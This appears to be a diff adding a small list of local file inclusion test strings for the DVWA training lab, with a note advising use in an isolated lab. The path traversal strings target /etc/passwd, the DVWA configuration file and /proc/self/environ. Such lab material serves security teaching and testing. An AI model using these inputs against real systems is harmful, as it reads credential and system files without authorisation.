@@ -1,0 +1,6 @@
+-- LFI test strings (DVWA file inclusion)
+../../../../etc/passwd
+../../../../var/www/html/DVWA/config/config.inc.php
+../../../../proc/self/environ
+
+Notes: DVWA includes an LFI lab page. Use carefully in isolated lab.
